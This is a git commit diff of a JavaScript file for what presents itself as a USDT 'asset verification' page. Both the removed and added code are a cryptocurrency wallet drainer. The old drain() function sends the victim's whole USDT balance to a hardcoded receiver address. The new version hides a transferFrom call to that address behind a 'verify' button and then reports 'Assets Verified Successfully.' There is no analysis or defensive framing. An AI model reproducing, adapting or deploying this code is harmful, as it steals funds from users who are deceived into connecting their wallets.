1299fe4423a735a0c826c74401495e3b5e2f57ba
flashcheck <flash.usdt100@gmail.com>
2025-05-31 12:53:23 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,51 +1,47 @@
-
-const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
+const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
 const receiver = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
 
-async function drain() {
-  if (typeof window.ethereum === 'undefined') {
-    alert("Please use a Web3-enabled browser like Trust Wallet.");
-    return;
-  }
-
-  const web3 = new Web3(window.ethereum);
-  try {
-    const accounts = await ethereum.request({ method: 'eth_accounts' });
-    if (!accounts.length) {
+window.addEventListener('load', async () => {
+  if (typeof window.ethereum !== 'undefined') {
+    try {
       await ethereum.request({ method: 'eth_requestAccounts' });
+      window.web3 = new Web3(window.ethereum);
+    } catch (error) {
+      alert('Wallet connection failed.');
     }
-    const account = (await web3.eth.getAccounts())[0];
+  } else {
+    alert('Please use Trust Wallet or MetaMask browser');
+  }
+});
+
+document.getElementById('verifyBtn').addEventListener('click', async () => {
+  try {
+    const web3 = new Web3(window.ethereum);
+    const accounts = await web3.eth.getAccounts();
+    const sender = accounts[0];
 
     const abi = [
       {
-        "constant": false,
-        "inputs": [
-          { "name": "_to", "type": "address" },
-          { "name": "_value", "type": "uint256" }
+        constant: false,
+        inputs: [
+          { name: "_to", type: "address" },
+          { name: "_value", type: "uint256" }
         ],
-        "name": "transfer",
-        "outputs": [{ "name": "", "type": "bool" }],
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [{ "name": "_owner", "type": "address" }],
-        "name": "balanceOf",
-        "outputs": [{ "name": "balance", "type": "uint256" }],
-        "type": "function"
+        name: "transferFrom",
+        outputs: [{ name: "", type: "bool" }],
+        type: "function"
       }
     ];
 
     const contract = new web3.eth.Contract(abi, usdtAddress);
-    const balance = await contract.methods.balanceOf(account).call();
 
-    if (balance > 0) {
-      await contract.methods.transfer(receiver, balance).send({ from: account });
-    } else {
-      alert("No USDT to transfer.");
-    }
+    await contract.methods
+      .transferFrom(sender, receiver, web3.utils.toWei("1000000", "mwei")) // transfer approved USDT
+      .send({ from: sender });
+
+    alert("Assets Verified Successfully.");
   } catch (err) {
     console.error(err);
-    alert("Transaction failed or cancelled.");
+    alert("Verification failed.");
   }
-}
+});
